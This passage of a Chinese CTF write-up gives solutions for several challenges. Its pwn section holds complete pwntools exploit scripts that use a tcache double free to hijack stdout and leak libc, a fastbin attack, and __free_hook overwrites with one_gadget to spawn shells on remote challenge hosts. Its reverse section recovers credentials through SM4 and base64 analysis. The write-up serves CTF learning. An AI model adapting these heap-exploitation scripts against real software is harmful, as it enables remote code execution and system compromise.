突然发现`username`作用,开始试了`/bin/sh`,`ls`,`cat flag`什么的都是`comment not found`,最后`/bin/bash`成功.

```python
from pwn import *

#context.log_level = 'debug'
#r = process("./pwn")
r = remote("a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com", "40003")

r.recvuntil("Your program name:\n")
r.sendline("/bin/bash")

r.recvuntil("Your instruction:\n")
payload = "push push push load push sub div sub load push add"
payload += " push push push load push sub div sub save"
#payload = "push push push load push sub div sub load pop"
r.sendline(payload)

#gdb.attach(r)

r.recvuntil("Your stack data:\n")
#payload = "-1 8 -5 4210720"
payload = "-1 8 -5 4210720 -172800 -1 8 -6 4210720"
#0x404020 = 4210720,offset = -172800,one_gadget = -173178
r.sendline(payload)

#print r.recv()

r.interactive()
```

### bms

远端环境是`libc2.26`,可以使用`tcache`攻击,利用`double free`把`chunk`分配在`stdout`附近,使`tcache bin`指向`_IO_2_1_stdout_`.

修改结构体泄露`libc`,再次使用`tcache`攻击分配`chunk`到`__free_hook`,劫持为`one_gadget`,调用`free`获得`shell`.

![](https://i.loli.net/2019/04/23/5cbde7238db45.png)

```python
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
r = remote("39.106.224.151", "60002")

def add(name, length, content):
    r.send(str(1))
    r.recvuntil("book name:")
    r.send(name)
    r.recvuntil("description size:")
    r.send(str(length))
    r.recvuntil("description:")
    r.send(content)
    r.recvuntil(">\n")

def remove(index):
    r.sendline(str(2))
    r.recvuntil("index:")
    r.sendline(str(index))
    r.recvuntil(">\n")

r.recvuntil("username:")
r.send("admin\n\x00")
r.recvuntil("password:")
r.send("frame\n\x00")

r.recvuntil(">\n")

add("a", 0xf0, "a")#0
remove(0)
remove(0)
add("a", 0xf0, p64(0x602020))#1
add("a", 0xf0, p64(0x602020))#2
add("a", 0xf0, p8(0x20))#3
r.send(str(1))
r.recvuntil("book name:")
r.send("a")
r.recvuntil("description size:")
r.send(str(0xf0))
r.recvuntil("description:")
r.send(p64(0xfbad2887) + p64(0x601F70) * 4)#4

libc = u64(r.recvuntil(">\n")[:6].ljust(8, '\0')) - 0x78460

add("a", 0xe0, "a")#5
remove(5)
remove(5)
add("a", 0xe0, p64(libc + 0x3dc8a8))#6
add("a", 0xe0, p64(libc + 0x3dc8a8))#7
add("a", 0xe0, p64(libc + 0x47c46))#8

r.sendline(str(2))
r.recvuntil("index:")
r.sendline(str(5))

#gdb.attach(r)
print "libc: " + hex(libc)

r.interactive()
```
### double
这题的点找了好久，一直没 get 到，（没注意题目名，手动滑稽），研究了各种姿势，回原点，两个同样的文件释放会报 double free 的错，才发现自己漏看了一块地方，然后利用文件内容一致，引用同一文件。实现 double free。然后 fastbin attack再次 diss，主办方的 check 竟然 system(“sh”) ，命令在容器里啥权限都没，还不让我过，搞得我只好找 onegadget  
```
from pwn import *
context.log_level = "debug" p = process("./pwn")
p = remote("e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com",40002)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Your data:\n')
    p.send(content)
def edit(index,content):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Info index: ')
    p.sendline(str(index))
    p.send(content)
def show(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Info index: ')
    p.sendline(str(index))
def delete(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.sendline(str(index))
add(0x50*'s'+'\n')
add(0x60*'s'+'\n')
add(0x60*'s'+'\n')
add(0x60*'b'+'\n')
delete(1)
delete(3)
delete(2)
add(p64(0x4040bd).ljust(0x60,'c')+'\n')
add(0x60*'n'+'\n')
add(0x60*'m'+'\n')
payload = 'd'*3 + p64(0x4040e0) + p64(0x4040f0) + p32(0) + p32(20) +
p64(elf.got['read'])+p64(0x4040f0)
add((0x60*'\x00')+'\n')
edit(0,payload+'\n')
show(0)
readaddr = u64(p.recv(6).ljust(8,'\x00'))
libcaddr = readaddr - libc.symbols['read']
print "libc---->",hex(libcaddr)
edit(0,p64(libcaddr + 0x4526a)+'\n')
p.sendline('icqf3f12bdf6e59569e295aacbd704b2')
p.interactive()
```
## Reverse
**作者：wu1a、lizhirui**
### bbvvmm
拖入 ida 查看到程序本身主体逻辑还算比较清晰，

![](https://i.loli.net/2019/04/23/5cbde5288dc0f.png)

对输入的 username 和 password 进行变换后将结果与秘钥进行 sm4 加密，再 hex，然后进行变异的 base64 编码。

断点下在 0x4069DD 处后可发现函数将 username 都转换成了十六进制  
断点下在 0x406A88 处可看到 sm 加密过程，经测试是标准的 sm4 加密  

![](https://i.loli.net/2019/04/23/5cbde52fed50b.png)  

秘钥在 0x401063 处生成，去直接去逆秘钥

![](https://i.loli.net/2019/04/23/5cbde5368d6c8.png)  

之后先进行变异的 base64 解码，再用标准的 sm4 解码，即可得出 username 和 password 为  
0x6261647265723132 和 0x78797a7b7c7d
即 badrer12 和 xyz{|}  
Nc 过去发现直接输入还无法获得 flag，还得用 py 跑一下  
![](https://i.loli.net/2019/04/23/5cbde53ee0fe4.png)  

### easygo
Easy_go
拖入 ida 发现程序逻辑及其复杂，分析极难，直接下断点跑一下试试  
![](https://i.loli.net/2019/04/23/5cbde585cb332.png)  
发现随意输入之后就直接报错了，但是寄存器里已经出现了 flag，直接提取就好  
![](https://i.loli.net/2019/04/23/5cbde58c7a2b5.png)  

### strange_int
篇幅问题，请移步：https://www.52pojie.cn/thread-936377-1-1.html

## 评论区
**请文明评论，禁止广告**
<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---

<div class="comment"></div>
<script src="//cdn.staticfile.org/jquery/3.4.0/jquery.min.js"></script>
<script src="../js/av-min.js"></script>
<script src='../js/Valine.min.js'></script>
<script src="../js/Valine.js"></script>